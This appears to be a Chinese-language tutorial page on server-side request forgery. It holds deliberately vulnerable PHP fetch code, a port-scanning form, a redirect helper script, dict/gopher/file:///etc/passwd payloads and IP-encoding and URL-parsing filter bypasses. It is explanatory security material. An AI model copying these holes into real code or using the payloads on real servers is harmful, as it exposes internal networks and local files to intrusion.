# SSRF

## SSRF 簡介

SSRF，Server-Side Request Forgery，服務端請求僞造，是一種由攻擊者構造形成由服務器端發起請求的一個漏洞。一般情況下，SSRF 攻擊的目標是從外網無法訪問的內部系統。

漏洞形成的原因大多是因爲服務端提供了從其他服務器應用獲取數據的功能且沒有對目標地址作過濾和限制。

攻擊者可以利用 SSRF 實現的攻擊主要有 5 種：

1.  可以對外網、服務器所在內網、本地進行端口掃描，獲取一些服務的 banner 信息
2.  攻擊運行在內網或本地的應用程序（比如溢出）
3.  對內網 WEB 應用進行指紋識別，通過訪問默認文件實現
4.  攻擊內外網的 web 應用，主要是使用 GET 參數就可以實現的攻擊（比如 Struts2，sqli 等）
5.  利用 `file` 協議讀取本地文件等

## SSRF 漏洞出現的場景

-   能夠對外發起網絡請求的地方，就可能存在 SSRF 漏洞
-   從遠程服務器請求資源（Upload from URL，Import & Export RSS Feed）
-   數據庫內置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）
-   Webmail 收取其他郵箱郵件（POP3、IMAP、SMTP）
-   文件處理、編碼處理、屬性信息處理（ffmpeg、ImageMagic、DOCX、PDF、XML）

## 常用的後端實現

1.  `file_get_contents`

    ```php
    <?php
    if (isset($_POST['url'])) { 
        $content = file_get_contents($_POST['url']); 
        $filename ='./images/'.rand().';img1.jpg'; 
        file_put_contents($filename, $content); 
        echo $_POST['url']; 
        $img = "<img src=\"".$filename."\"/>"; 
    }
    echo $img;
    ?>
    ```

    這段代碼使用 `file_get_contents` 函數從用戶指定的 URL 獲取圖片。然後把它用一個隨機文件名保存在硬盤上，並展示給用戶。

2.  `fsockopen()`

    ```php
    <?php 
    function GetFile($host,$port,$link) { 
        $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
        if (!$fp) { 
            echo "$errstr (error number $errno) \n"; 
        } else { 
            $out = "GET $link HTTP/1.1\r\n"; 
            $out .= "Host: $host\r\n"; 
            $out .= "Connection: Close\r\n\r\n"; 
            $out .= "\r\n"; 
            fwrite($fp, $out); 
            $contents=''; 
            while (!feof($fp)) { 
                $contents.= fgets($fp, 1024); 
            } 
            fclose($fp); 
            return $contents; 
        } 
    }
    ?>
    ```

    這段代碼使用 `fsockopen` 函數實現獲取用戶指定 URL 的數據（文件或者 HTML）。這個函數會使用 socket 跟服務器建立 TCP 連接，傳輸原始數據。

3.  `curl_exec()`

    ```php
    <?php 
    if (isset($_POST['url'])) {
        $link = $_POST['url'];
        $curlobj = curl_init();
        curl_setopt($curlobj, CURLOPT_POST, 0);
        curl_setopt($curlobj,CURLOPT_URL,$link);
        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
        $result=curl_exec($curlobj);
        curl_close($curlobj);

        $filename = './curled/'.rand().'.txt';
        file_put_contents($filename, $result); 
        echo $result;
    }
    ?>
    ```

    使用 `curl` 獲取數據。

## 阻礙 SSRF 漏洞利用的場景

-   服務器開啓 OpenSSL 無法進行交互利用
-   服務端需要鑑權（Cookies & User：Pass）不能完美利用
-   限制請求的端口爲http常用的端口，比如，80,443,8080,8090。
-   禁用不需要的協議。僅僅允許http和https請求。可以防止類似於file:///,gopher://,ftp:// 等引起的問題。
-   統一錯誤信息，避免用戶可以根據錯誤信息來判斷遠端服務器的端口狀態。
## 利用 SSRF 進行端口掃描

根據服務器的返回信息進行判斷，大部分應用不會判別端口，可通過返回的 banner 信息判斷端口狀態。

後端實現

```php
<?php 
if (isset($_POST['url'])) {
    $link = $_POST['url'];
    $filename = './curled/'.rand().'txt';
    $curlobj = curl_init($link);
    $fp = fopen($filename,"w");
    curl_setopt($curlobj, CURLOPT_FILE, $fp);
    curl_setopt($curlobj, CURLOPT_HEADER, 0);
    curl_exec($curlobj);
    curl_close($curlobj);
    fclose($fp);
    $fp = fopen($filename,"r");
    $result = fread($fp, filesize($filename)); 
    fclose($fp);
    echo $result;
}
?>
```

構造一個前端頁面

```html
<html>
<body>
  <form name="px" method="post" action="http://127.0.0.1/ss.php">
    <input type="text" name="url" value="">
    <input type="submit" name="commit" value="submit">
  </form>
  <script></script>
</body>
</html>
```

請求非 HTTP 的端口可以返回 banner 信息。

或可利用 302 跳轉繞過 HTTP 協議的限制。

輔助腳本

```php
<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$scheme = $_GET['s'];
$data = $_GET['data'];
header("Location: $scheme://$ip:$port/$data");
?>
```

[騰訊某處 SSRF 漏洞（非常好的利用點）附利用腳本](https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html)

## 協議利用

-   Dict 協議

    ```
    dict://fuzz.wuyun.org:8080/helo:dict
    ```

-   Gopher 協議

    ```
    gopher://fuzz.wuyun.org:8080/gopher
    ```

-   File 協議

    ```
    file:///etc/passwd
    ```
    
## 繞過姿勢
1.  更改IP地址寫法
    例如`192.168.0.1`
    
    - 8進制格式：`0300.0250.0.1`
    - 16進制格式：`0xC0.0xA8.0.1`
    - 10進制整數格式：`3232235521`
    - 16進制整數格式：`0xC0A80001`
    - 還有一種特殊的省略模式，例如`10.0.0.1`這個IP可以寫成`10.1`

2.  利用URL解析問題
    在某些情況下，後端程序可能會對訪問的URL進行解析，對解析出來的host地址進行過濾。這時候可能會出現對URL參數解析不當，導致可以繞過過濾。
    例如：
    -   `http://www.baidu.com@192.168.0.1/`與`http://192.168.0.1`請求的都是`192.168.0.1`的內容
    -   可以指向任意ip的域名`xip.io`：`http://127.0.0.1.xip.io/`==>`http://127.0.0.1/`
    -   短地址`http://dwz.cn/11SMa`==>`http://127.0.0.1`
    -   利用句號`。`：`127。0。0。1`==>`127.0.0.1`
    -   利用Enclosed alphanumerics
        ```
        ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
        List:
        ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
        ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
        ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
        ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
        Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
        ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
        ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
        ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
        ```
        
## 危害

* 可以對外網、服務器所在內網、本地進行端口掃描，獲取一些服務的banner信息;
* 攻擊運行在內網或本地的應用程序（比如溢出）;
* 對內網web應用進行指紋識別，通過訪問默認文件實現;
* 攻擊內外網的web應用，主要是使用get參數就可以實現的攻擊（比如struts2，sqli等）;
* 利用file協議讀取本地文件等。

## 參考資料

-   [《Build Your SSRF EXP Autowork》豬豬俠](http://tools.40huo.cn/#!papers.md)
-   [騰訊某處 SSRF 漏洞（非常好的利用點）附利用腳本](https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html)
-   [bilibili 某分站從信息泄露到 ssrf 再到命令執行](https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html)
